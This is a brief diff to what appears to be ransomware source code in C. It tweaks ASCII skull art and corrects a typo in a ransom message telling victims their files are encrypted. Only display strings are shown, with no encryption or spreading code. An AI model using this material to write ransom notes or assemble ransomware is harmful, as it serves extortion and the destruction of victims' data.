@@ -24,10 +24,10 @@
 " u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$        \n" \
 " $$$$$$$$$$****           **$$$$$$$$$$$*       \n" \
 "   *$$$$$*                      **$$$$**       \n" \
-"     $$$*                         $$$$*"
+"     $$$*                         $$$$*        "
 
 #define RANSOM_MSG \
-"Ooops, your import files are encrypted.\n" \
+"Ooops, your important files are encrypted.\n" \
 "\n" \
 "If you see this text, then your files are no longer accessible,\n" \
 "because they have been encrypted. Perhaps you are busy looking for a way to\n" \
